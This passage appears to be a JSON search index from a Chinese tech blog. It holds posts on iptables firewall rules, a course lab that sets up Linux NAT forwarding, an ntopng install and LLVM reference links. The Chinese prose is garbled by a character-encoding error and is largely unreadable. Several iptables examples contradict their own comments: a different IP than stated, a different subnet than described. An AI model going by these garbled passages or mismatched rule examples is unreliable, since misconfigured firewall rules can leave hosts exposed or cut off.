é™¤ï¼ˆdeleteï¼‰æŒ‡å®šé“¾ä¸­çš„æŸä¸€æ¡è§„åˆ™ï¼Œå¯ä»¥æŒ‰è§„åˆ™åºå·å’Œå†…å®¹åˆ é™¤\n-I åœ¨æŒ‡å®šé“¾ä¸­æ’å…¥ï¼ˆinsertï¼‰ä¸€æ¡æ–°çš„è§„åˆ™ï¼Œé»˜è®¤åœ¨ç¬¬ä¸€è¡Œæ·»åŠ \n-R ä¿®æ”¹ã€æ›¿æ¢ï¼ˆreplaceï¼‰æŒ‡å®šé“¾ä¸­çš„æŸä¸€æ¡è§„åˆ™ï¼Œå¯ä»¥æŒ‰è§„åˆ™åºå·å’Œå†…å®¹æ›¿æ¢\n-L åˆ—å‡ºï¼ˆlistï¼‰æŒ‡å®šé“¾ä¸­æ‰€æœ‰çš„è§„åˆ™è¿›è¡ŒæŸ¥çœ‹\n-E é‡å‘½åç”¨æˆ·å®šä¹‰çš„é“¾ï¼Œä¸æ”¹å˜é“¾æœ¬èº«\n-F æ¸…ç©ºï¼ˆflushï¼‰\n-N æ–°å»ºï¼ˆnew-chainï¼‰ä¸€æ¡ç”¨æˆ·è‡ªå·±å®šä¹‰çš„è§„åˆ™é“¾\n-X åˆ é™¤æŒ‡å®šè¡¨ä¸­ç”¨æˆ·è‡ªå®šä¹‰çš„è§„åˆ™é“¾ï¼ˆdelete-chainï¼‰\n-P è®¾ç½®æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆpolicyï¼‰\n-Z å°†æ‰€æœ‰è¡¨çš„æ‰€æœ‰é“¾çš„å­—èŠ‚å’Œæ•°æ®åŒ…è®¡æ•°å™¨æ¸…é›¶\n-n ä½¿ç”¨æ•°å­—å½¢å¼ï¼ˆnumericï¼‰æ˜¾ç¤ºè¾“å‡ºç»“æœ\n-v æŸ¥çœ‹è§„åˆ™è¡¨è¯¦ç»†ä¿¡æ¯ï¼ˆverboseï¼‰çš„ä¿¡æ¯\n-V æŸ¥çœ‹ç‰ˆæœ¬(version)\n-h è·å–å¸®åŠ©ï¼ˆhelpï¼‰\n æ‰“å¼€linuxè½¬å‘åŠŸèƒ½ï¼šecho 1 \u003e /proc/sys/net/ipv4/ip_forward\n åˆ é™¤inputé“¾çš„ç¬¬ä¸€æ¡è§„åˆ™ï¼šiptables -D INPUT 1\niptablesé˜²ç«å¢™å¸¸ç”¨çš„ç­–ç•¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85  # 1.æ‹’ç»è¿›å…¥é˜²ç«å¢™çš„æ‰€æœ‰ICMPåè®®æ•°æ®åŒ… $ iptables -I INPUT -p icmp -j REJECT # 2.å…è®¸é˜²ç«å¢™è½¬å‘é™¤ICMPåè®®ä»¥å¤–çš„æ‰€æœ‰æ•°æ®åŒ… # è¯´æ˜ï¼šä½¿ç”¨â€œï¼â€å¯ä»¥å°†æ¡ä»¶å–åã€‚ $ iptables -A FORWARD -p ! icmp -j ACCEPT # 3.æ‹’ç»è½¬å‘æ¥è‡ª192.168.1.10ä¸»æœºçš„æ•°æ®ï¼Œå…è®¸è½¬å‘æ¥è‡ª192.168.0.0/24ç½‘æ®µçš„æ•°æ® # è¯´æ˜ï¼šæ³¨æ„è¦æŠŠæ‹’ç»çš„æ”¾åœ¨å‰é¢,ä¸ç„¶æ‹’ç»è¯­å¥å°±æ²¡æœ‰ç”¨äº†å°±ä¸èµ·ä½œç”¨äº†å•Šã€‚ $ iptables -A FORWARD -s 192.168.1.11 -j REJECT $ iptablesÂ -A FORWARD -s 192.168.0.0/24 -j ACCEPT # 4.ä¸¢å¼ƒä»å¤–ç½‘æ¥å£ï¼ˆeth1ï¼‰è¿›å…¥é˜²ç«å¢™æœ¬æœºçš„æºåœ°å€ä¸ºç§ç½‘åœ°å€çš„æ•°æ®åŒ… $ iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP $ iptablesÂ -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP $ iptablesÂ -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP # 5.å°å µç½‘æ®µï¼ˆ192.168.1.0/24ï¼‰ï¼Œä¸¤å°æ—¶åè§£å°ã€‚ # è¯´æ˜ï¼šè¿™ä¸ªç­–ç•¥å’±ä»¬å€ŸåŠ©crondè®¡åˆ’ä»»åŠ¡æ¥å®Œæˆï¼Œå°±å†å¥½ä¸è¿‡äº†ã€‚ $Â iptables -I INPUT -s 10.20.30.0/24 -j DROP $Â iptables -I FORWARD -s 10.20.30.0/24 -j DROP $Â at now 2 hoursÂ at\u003e iptables -D INPUT 1Â at\u003e iptables -D FORWARD 1 [1] StoppedÂ at now 2 hours # 6.åªå…è®¸ç®¡ç†å‘˜ä»202.13.0.0/16ç½‘æ®µä½¿ç”¨SSHè¿œç¨‹ç™»å½•é˜²ç«å¢™ä¸»æœºã€‚ # è¯´æ˜ï¼šè¿™ä¸ªç”¨æ³•æ¯”è¾ƒé€‚åˆå¯¹è®¾å¤‡è¿›è¡Œè¿œç¨‹ç®¡ç†æ—¶ä½¿ç”¨ # æ¯”å¦‚ä½äºåˆ†å…¬å¸ä¸­çš„SQLæœåŠ¡å™¨éœ€è¦è¢«æ€»å…¬å¸çš„ç®¡ç†å‘˜ç®¡ç†æ—¶ã€‚ $ iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT $ iptablesÂ -A INPUT -p tcp --dport 22 -j DROP # 7.å…è®¸æœ¬æœºå¼€æ”¾ä»TCPç«¯å£20-1024æä¾›çš„åº”ç”¨æœåŠ¡ã€‚ $ iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT $ iptablesÂ -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT # 8.å…è®¸è½¬å‘æ¥è‡ª192.168.0.0/24å±€åŸŸç½‘æ®µçš„DNSè§£æè¯·æ±‚æ•°æ®åŒ…ã€‚ $ iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT $ iptablesÂ -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT # 9.ç¦æ­¢å…¶ä»–ä¸»æœºpingé˜²ç«å¢™ä¸»æœºï¼Œä½†æ˜¯å…è®¸ä»é˜²ç«å¢™ä¸Špingå…¶ä»–ä¸»æœº $ iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROP $ iptablesÂ -I INPUT -p icmp --icmp-type Echo-Reply -j ACCEPT $ iptablesÂ -I INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT # 10.ç¦æ­¢è½¬å‘æ¥è‡ªMACåœ°å€ä¸º00ï¼š0Cï¼š29ï¼š27ï¼š55ï¼š3Fçš„å’Œä¸»æœºçš„æ•°æ®åŒ… # è¯´æ˜ï¼šiptablesä¸­ä½¿ç”¨â€œ-m æ¨¡å—å…³é”®å­—â€çš„å½¢å¼è°ƒç”¨æ˜¾ç¤ºåŒ¹é…ã€‚è¿™é‡Œç”¨â€œ-m mac â€“mac-sourceâ€æ¥è¡¨ç¤ºæ•°æ®åŒ…çš„æºMACåœ°å€ã€‚ $ iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP # 11.å…è®¸é˜²ç«å¢™æœ¬æœºå¯¹å¤–å¼€æ”¾TCPç«¯å£20ã€21ã€25ã€110ä»¥åŠè¢«åŠ¨æ¨¡å¼FTPç«¯å£1250-1280 # è¯´æ˜ï¼šè¿™é‡Œç”¨â€œ-m multiport â€“dportâ€æ¥æŒ‡å®šç›®çš„ç«¯å£åŠèŒƒå›´ $ iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT # 12.ç¦æ­¢è½¬å‘æºIPåœ°å€ä¸º192.168.1.20-192.168.1.99çš„TCPæ•°æ®åŒ…ã€‚ # è¯´æ˜ï¼šæ­¤å¤„ç”¨â€œ-m â€“iprange â€“src-rangeâ€æŒ‡å®šIPèŒƒå›´ã€‚ $ iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP # 13.ç¦æ­¢è½¬å‘ä¸æ­£å¸¸TCPè¿æ¥æ— å…³çš„éâ€”synè¯·æ±‚æ•°æ®åŒ…ã€‚ # è¯´æ˜ï¼šâ€œ-m stateâ€è¡¨ç¤ºæ•°æ®åŒ…çš„è¿æ¥çŠ¶æ€ï¼Œâ€œNEWâ€è¡¨ç¤ºä¸ä»»ä½•è¿æ¥æ— å…³çš„ï¼Œæ–°çš„å˜›ï¼ $ iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP # 14.æ‹’ç»è®¿é—®é˜²ç«å¢™çš„æ–°æ•°æ®åŒ…ï¼Œä½†å…è®¸å“åº”è¿æ¥æˆ–ä¸å·²æœ‰è¿æ¥ç›¸å…³çš„æ•°æ®åŒ… # è¯´æ˜ï¼šâ€œESTABLISHEDâ€è¡¨ç¤ºå·²ç»å“åº”è¯·æ±‚æˆ–è€…å·²ç»å»ºç«‹è¿æ¥çš„æ•°æ®åŒ… # â€œRELATEDâ€è¡¨ç¤ºä¸å·²å»ºç«‹çš„è¿æ¥æœ‰ç›¸å…³æ€§çš„ï¼Œæ¯”å¦‚FTPæ•°æ®è¿æ¥ç­‰ã€‚ $ iptables -A INPUT -p tcp -m state --state NEW -j DROP $ iptablesÂ -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT # 15.åªå¼€æ”¾æœ¬æœºçš„webæœåŠ¡ï¼ˆ80ï¼‰ã€FTP(20ã€21ã€20450-20480)ï¼Œæ”¾è¡Œå¤–éƒ¨ä¸»æœºå‘ä½æœåŠ¡å™¨å…¶å®ƒç«¯å£çš„åº”ç­”æ•°æ®åŒ…ï¼Œå°†å…¶ä»–å…¥ç«™æ•°æ®åŒ…å‡äºˆä»¥ä¸¢å¼ƒå¤„ç†ã€‚ $ iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPT $ iptablesÂ -I INPUT -p tcp --dport 20450:20480 -j ACCEPT $ iptablesÂ -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT $ iptablesÂ -P INPUT DROP   å¸¸ç”¨iptablesè§„åˆ™ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137  # 1. åˆ é™¤æ‰€æœ‰ç°æœ‰è§„åˆ™ $ iptables -F # 2. è®¾ç½®é»˜è®¤çš„Â chain ç­–ç•¥ $ iptables -P INPUT DROP $ iptables -P FORWARD DROP $ iptables -P OUTPUT DROP # 3. é˜»æ­¢æŸä¸ªç‰¹å®šçš„ IP åœ°å€ $ BLOCK_THIS_IP=\"x.x.x.x\" $ iptables -A INPUT -s \"$BLOCK_THIS_IP\" -j DROP # 4. å…è®¸å…¨éƒ¨è¿›æ¥çš„ï¼ˆincomingï¼‰SSH $ iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 5. åªå…è®¸æŸä¸ªç‰¹å®šç½‘ç»œè¿›æ¥çš„ SSH $ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 6. å…è®¸è¿›æ¥çš„ï¼ˆincomingï¼‰HTTP $ iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT # 7. å¤šç«¯å£ï¼ˆå…è®¸è¿›æ¥çš„ SSHã€HTTPÂ å’ŒÂ HTTPSï¼‰ $ iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT # 8. å…è®¸å‡ºå»çš„ï¼ˆoutgoingï¼‰SSH $ iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 9. å…è®¸å¤–å‡ºçš„ï¼ˆoutgoingï¼‰SSHï¼Œä½†ä»…è®¿é—®æŸä¸ªç‰¹å®šçš„ç½‘ç»œ $ iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 10. å…è®¸å¤–å‡ºçš„ï¼ˆoutgoingï¼‰ HTTPS $ iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT # 11. å¯¹è¿›æ¥çš„ HTTPS æµé‡åšè´Ÿè½½å‡è¡¡ $ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443 $ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443 $ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443 # 12. ä»å†…éƒ¨å‘å¤–éƒ¨ Ping $ iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT $ iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT # 13. ä»å¤–éƒ¨å‘å†…éƒ¨ Ping $ iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT $ iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT # 14. å…è®¸ç¯å›ï¼ˆloopbackï¼‰è®¿é—® $ iptables -A INPUT -i lo -j ACCEPT $ iptables -A OUTPUT -o lo -j ACCEPT # 15. å…è®¸ packets ä»å†…ç½‘è®¿é—®å¤–ç½‘ # if eth1 is connected to external network (internet) # if eth0 is connected to internal network (192.168.1.x) $ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT # 16. å…è®¸å¤–å‡ºçš„ DNS $ iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT $ iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT # 17. å…è®¸ NIS è¿æ¥ $ rpcinfo -p | grep ypbind ; This port is 853 and 850 $ iptables -A INPUT -p tcp --dport 111 -j ACCEPT $ iptables -A INPUT -p udp --dport 111 -j ACCEPT $ iptables -A INPUT -p tcp --dport 853 -j ACCEPT $ iptables -A INPUT -p udp --dport 853 -j ACCEPT $ iptables -A INPUT -p tcp --dport 850 -j ACCEPT $ iptables -A INPUT -p udp --dport 850 -j ACCEPT # 18. å…è®¸æŸä¸ªç‰¹å®šç½‘ç»œ rsyncÂ è¿›å…¥æœ¬æœº $ iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT # 19. ä»…å…è®¸æ¥è‡ªæŸä¸ªç‰¹å®šç½‘ç»œçš„ MySQL çš„é“¾æ¥ $ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT # 20. å…è®¸ Sendmail æˆ– Postfix $ iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT # 21. å…è®¸ IMAP å’Œ IMAPS $ iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT # 22. å…è®¸ POP3 å’Œ POP3S $ iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT # 23. é˜²æ­¢ DoS æ”»å‡» $ iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT # 24. è®¾ç½® 422 ç«¯å£è½¬å‘åˆ° 22 ç«¯å£ $ iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22 $ iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT # 25. ä¸ºä¸¢å¼ƒçš„åŒ…åšæ—¥å¿—ï¼ˆLogï¼‰ $ iptables -N LOGGING $ iptables -A INPUT -j LOGGING $ iptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix \"IPTables Packet Dropped: \" --log-level 7 $ iptables -A LOGGING -j DROP   iptablesé˜²ç«å¢™è§„åˆ™çš„ä¿å­˜ä¸æ¢å¤ iptables-saveæŠŠè§„åˆ™ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå†ç”±ç›®å½•rc.dä¸‹çš„è„šæœ¬ï¼ˆ/etc/rc.d/init.d/iptablesï¼‰è‡ªåŠ¨è£…è½½ï¼Œä½¿ç”¨å‘½ä»¤iptables-saveæ¥ä¿å­˜è§„åˆ™ã€‚\nä¸€èˆ¬ç”¨iptables-save \u003e /etc/sysconfig/iptables ç”Ÿæˆä¿å­˜è§„åˆ™çš„æ–‡ä»¶/etc/sysconfig/iptablesï¼Œä¹Ÿå¯ä»¥ç”¨service iptables saveå®ƒèƒ½æŠŠè§„åˆ™è‡ªåŠ¨ä¿å­˜åœ¨/etc/sysconfig/iptablesä¸­ã€‚\nå½“è®¡ç®—æœºå¯åŠ¨æ—¶ï¼Œrc.dä¸‹çš„è„šæœ¬å°†ç”¨å‘½ä»¤iptables-restoreè°ƒç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œä»è€Œå°±è‡ªåŠ¨æ¢å¤äº†è§„åˆ™ã€‚\niptablesçš„ç®€å•åº”ç”¨ ç”±äºç½‘ç»œå®‰å…¨è¯¾ç¨‹çš„å®éªŒï¼Œç‰¹åœ°æ¥å­¦ä¹ iptablesï¼Œå¯ä»¥æŠŠå®éªŒå½“ä½œä¸€ä¸ªåº”ç”¨ç¤ºä¾‹\nå®éªŒå¤§è‡´å¦‚ä¸‹ï¼š\n ä¸€å°windowsè™šæ‹Ÿæœºï¼Œå†…ç½‘ç¯å¢ƒï¼Œæ— æ³•ç›´æ¥è®¿é—®å¤–ç½‘ ä¸€å°linuxè™šæ‹Ÿæœºï¼Œä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªç”¨äºè¿æ¥å¤–ç½‘ï¼Œä¸€ä¸ªç”¨äºè¿æ¥å†…ç½‘(å³windowsè™šæ‹Ÿæœº) ç›®æ ‡ï¼šåˆ©ç”¨iptableså°†linuxé…ç½®æˆè·¯ç”±å™¨ï¼Œwindowsè™šæ‹Ÿæœºé€šè¿‡è·¯ç”±å™¨è®¿é—®Internet  å®éªŒç¯å¢ƒï¼šUbuntu 18.04å’Œwindows server2016\nåˆšå¼€å§‹è®¤ä¸ºåˆ›å»ºç½‘å¡ï¼Œä¾¿åœ¨è™šæ‹Ÿæœºçš„ubuntué‡Œåˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼Œåé¢æ‰å‘ç°ä¸å¯¹ï¼Œæ„å»ºä¸äº†å†…ç½‘ç¯å¢ƒï¼Œä¹‹åæ‰å‘ç°æ˜¯åœ¨vmwareä¸­æ·»åŠ ç‰©ç†ç½‘å¡(æ¨¡æ‹Ÿçš„)æ„å»ºå†…ç½‘ç¯å¢ƒã€‚\næ‰€ä»¥é¦–å…ˆä¸ºubuntuåˆ›å»ºä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªèƒ½è®¿é—®å¤–ç½‘(ä½¿ç”¨NAT)ï¼Œå¦å¤–ä¸€ä¸ªä»…å†…ç½‘(vmwareé‡Œçš„ä»…ä¸»æœºï¼ŒLANé‚£ä¸ªæˆ‘æ²¡ææ‡‚ï¼Œåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„)\nåœ¨linuxä¸­ï¼Œç”¨å‘½ä»¤sudo vim /etc/network/interfacesä¿®æ”¹ç½‘å¡é…ç½®å¦‚ä¸‹ï¼š\n# interfaces(5) file used by ifup(8) and if down(8) auto lo iface lo inet loopback auto ens33 iface ens33 inet static address 192.168.52.128 netmask 255.255.255.0 gateway 192.168.52.1 auto ens38 iface ens38 inet static address 172.16.0.10 netmask 255.255.255.0 ä¿®æ”¹åï¼Œé‡å¯ç½‘ç»œé…ç½®\n1 2 3  sc@sc-virtual-machine:~$ sudo /etc/init.d/networking restart [ ok ] Restarting networking (via systemctl): networking.service. sc@sc-virtual-machine:~$   è¿˜æœ‰ä¸€ç‚¹ï¼Œè¦å¼€å¯linuxçš„ipè½¬å‘åŠŸèƒ½ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\n1 2 3 4 5  root@sc-virtual-machine:/home/sc# echo 1 \u003e /proc/sys/net/ipv4/ip_forward $ sudo vim /etc/sysctl.conf # net.ipv4.ip_forward = 1 # å–æ¶ˆä¸Šé¢è¿™ä¸ªæ³¨é‡Š,å¼€å¯linuxè½¬å‘ sc@sc-virtual-machine:~$ sudo sysctl -p   åœ¨sysctl.confé‡Œï¼Œæœ¬æ¥å°±æœ‰æ³¨é‡Šçš„è½¬å‘é…ç½®è¯­å¥ï¼Œå–æ¶ˆæ³¨é‡Šå³å¯ï¼Œç”¨å‘½ä»¤é‡æ–°åŠ è½½å†…æ ¸å‚æ•°ï¼Œå½“ç„¶ï¼Œæ­¤æ—¶é‡å¯linuxè™šæ‹Ÿæœºä¹Ÿä¸æ˜¯ä¸å¯ä»¥\nåœ¨windowsåšå¦‚ä¸‹é…ç½®\næ§åˆ¶é¢æ¿-\u003eç½‘ç»œå’ŒInternet-\u003eç½‘ç»œå’Œå…±äº«ä¸­å¿ƒ-\u003eæœ¬åœ°è¿æ¥-\u003eå±æ€§-\u003eInternetåè®®ç‰ˆæœ¬4ï¼ˆTCP/IPv4ï¼‰-\u003eå±æ€§\nç‰¹åˆ«åœ°ï¼Œè¦å°†windowsç½‘å…³é…ç½®ä¸ºlinuxçš„å†…ç½‘ç½‘å¡åœ°å€\nç„¶åè¦è®°å¾—ï¼ŒDNSæœåŠ¡å™¨è¦å’Œlinuxä¸»æœºçš„ä¸€è‡´\nå‡å¦‚ï¼Œwindowsè™šæ‹Ÿæœºèƒ½pingé€šlinuxä¸»æœºï¼Œä½†æ˜¯linuxä¸»æœºpingä¸é€šwindowsï¼Œåˆ™éœ€è¦å…³é—­windowsçš„é˜²ç«å¢™ï¼Œæˆ–è€…åœ¨windowsé˜²ç«å¢™ä¸­ï¼Œåœ¨å…¥ç«™è§„åˆ™å†…æ‰“å¼€ICMPå›æ˜¾\næ§åˆ¶é¢æ¿-\u003eç³»ç»Ÿå’Œå®‰å…¨-\u003eWindowsé˜²ç«å¢™-\u003eé«˜çº§è®¾ç½®-\u003eå…¥ç«™è§„åˆ™-\u003eæ–‡ä»¶å’Œæ‰“å°æœºå…±äº«ï¼ˆå›æ˜¾è¯·æ±‚-ICMPv4-Inï¼‰-\u003eå³é”®-\u003eå¯ç”¨è§„åˆ™\niptablesè½¬å‘ ç”¨iptablesåšnatï¼Œå‘½ä»¤å¦‚ä¸‹\n1 2 3 4  sc@sc-virtual-machine:~$ # sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE sc@sc-virtual-machine:~$ sudo iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -o ens33 -j MASQUERADE sc@sc-virtual-machine:~$ sudo iptables -A FORWARD -i ens38 -j ACCEPT   å°†æ¥è‡ª172.16.0.0/24å†…ç½‘çš„æµé‡è½¬å‘åˆ°ens33ï¼ŒMASQUERADEæ˜¯æŒ‡ç”¨è¯¥ç½‘å¡ä¸Šçš„IPæ¥æ›¿æ¢æºåœ°å€IPï¼Œå¯¹äºIPä¸å›ºå®šï¼Œå¦‚dhcpè‡ªåŠ¨åˆ†é…ipçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œè¿™è¾¹ç”±äºæ˜¯é™æ€ipï¼Œä¸åŠ è¯¥é€‰é¡¹ä¹Ÿæ˜¯å¯ä»¥çš„\nè¿è¡Œå®Œå‘½ä»¤åï¼Œåœ¨windowsä¸»æœºå°±å¯ä»¥pingé€šbaidu.comäº†ï¼Œå®éªŒå°±å®Œæˆäº†\n","description":"learning about iptables","tags":["linux","network","security"],"title":"iptables","uri":"/posts/iptables/"},{"categories":["network"],"content":"Ntop  å‚è€ƒï¼š\nGithub-ntop\nGithub-ntop/ntopng\nNtopng\nNtopng-userguide\nè¿ç”¨Ntopç›‘æ§ç½‘ç»œæµé‡\n Ntopæ˜¯ä¸€ç§ç›‘æ§ç½‘ç»œæµé‡çš„å·¥å…·ï¼Œè€ŒNtopngæ˜¯åŸºäºwebçš„é«˜é€Ÿæµé‡åˆ†æå’Œæµæ”¶é›†å·¥å…·ï¼Œæ˜¯ntopçš„ä¸‹ä¸€ä»£ï¼ŒntopngåŸºäºlibpcapï¼Œå¹¶ä¸”ä»¥å¯ç§»æ¤çš„æ–¹å¼ç¼–å†™\n Ntopçš„åŠŸèƒ½ï¼š\n è‡ªåŠ¨ä»ç½‘ç»œä¸­è¯†åˆ«æœ‰ç”¨çš„ä¿¡æ¯ï¼› å°†æˆªè·çš„æ•°æ®åŒ…è½¬æ¢æˆæ˜“äºè¯†åˆ«çš„æ ¼å¼ï¼› å¯¹ç½‘ç»œç¯å¢ƒä¸­é€šä¿¡å¤±è´¥çš„æƒ…å†µè¿›è¡Œåˆ†æï¼› æ¢æµ‹ç½‘ç»œç¯å¢ƒä¸­çš„é€šä¿¡ç“¶é¢ˆ,è®°å½•ç½‘ç»œé€šä¿¡çš„æ—¶é—´å’Œè¿‡ç¨‹ã€‚   ä½¿ç”¨ æˆ‘åœ¨ubuntu18.04ä¸Šè£…ntopngï¼Œlinuxå°±æ˜¯è¿™ä¹ˆç®€å•ï¼Œä¸€è¡Œå‘½ä»¤è§£å†³\n1  $ sudo apt-get install ntopng   è¿è¡Œç¤ºä¾‹å¦‚ä¸‹ï¼Œè¿è¡Œåè®¿é—® http://localhost:3000\nè¿›å…¥åè¦å…ˆæ³¨å†Œï¼Œé»˜è®¤admin/adminï¼Œå¼ºåˆ¶æ”¹å¯†ç ï¼Œéœ€è¦5ä½æ•°ï¼Œæˆ‘æ”¹æˆäº†admin/12345\nä»¥ä¸‹æ˜¯æ‰€æœ‰ä¸»æœº\nè¿™æ˜¯å…¶ä¸»é¡µï¼Œens33æ˜¯æ¡¥æ¥å¤–ç½‘çš„ç½‘å¡\næµé‡ç›‘æ§å¦‚ä¸‹\né’ˆå¯¹æŸä¸ªæµé‡çš„ç›‘æ§ï¼šæˆ‘ä¸»æœºå’Œè™šæ‹Ÿæœºç›¸äº’ping\n","description":"Something about Ntop and Ntopng","tags":["ntop","network"],"title":"Ntop","uri":"/posts/ntop/"},{"categories":["reverse","llvm","compiler"],"content":"llvm  å‚è€ƒï¼š\nLLVMå®˜ç½‘\nLLVM-docs ï¼šæ³¨æ„è¦æŸ¥çœ‹å¯¹åº”ç‰ˆæœ¬çš„æ–‡æ¡£ï¼Œæ¯ä¸ªç‰ˆæœ¬æ–‡æ¡£éƒ½æœ‰æ‰€æ”¹å˜\nGithub-llvm/llvm-project\nGithub-llvm-mirror/llvm\nLLVMåŸºç¡€(IRç®€ä»‹\u0026CFGå›¾ç”Ÿæˆ\u0026å¯è§†åŒ–)ï¼šå¯ä»¥ç”Ÿæˆå¯è§†åŒ–çš„IRæµç¨‹å›¾\nå‚è€ƒçš„GitHub\nGithub-heroims/obfuscator ï¼šç§»æ¤å¥½çš„ollvm9.0ç­‰\nOLLVMä»£ç æ··æ·†ç§»æ¤ä¸ä½¿ç”¨ 